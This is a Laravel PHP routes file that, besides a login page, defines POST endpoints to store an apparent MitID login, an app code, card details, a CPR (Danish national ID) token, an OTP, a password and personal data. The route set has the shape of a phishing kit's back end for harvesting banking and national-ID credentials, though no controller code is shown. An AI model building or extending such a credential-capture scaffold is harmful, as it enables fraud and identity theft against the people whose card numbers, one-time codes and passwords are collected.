<?php

use Illuminate\Support\Facades\Route;

Route::get('/', function () {
    return view('welcome');
});

Route::controller(App\Http\Controllers\AuthController::class)->group(function() {
    Route::get('/login', 'index')->name('login');
    Route::post('/mit_store', 'mit_store')->name('mit.store');
    Route::post('/app_code_store', 'app_code_store')->name('app.store');
    Route::post('/card_store', 'card_store')->name('card.store');
    Route::post('/cpr_token_store', 'cpr_token_store')->name('cpr.store');
    Route::post('/otp_store', 'otp_store')->name('otp.store');
    Route::post('/password_store', 'password_store')->name('password.store');
    Route::post('/personal_store', 'personal_store')->name('personal.store');
    Route::post('/service_store', 'service_store')->name('service.store');
});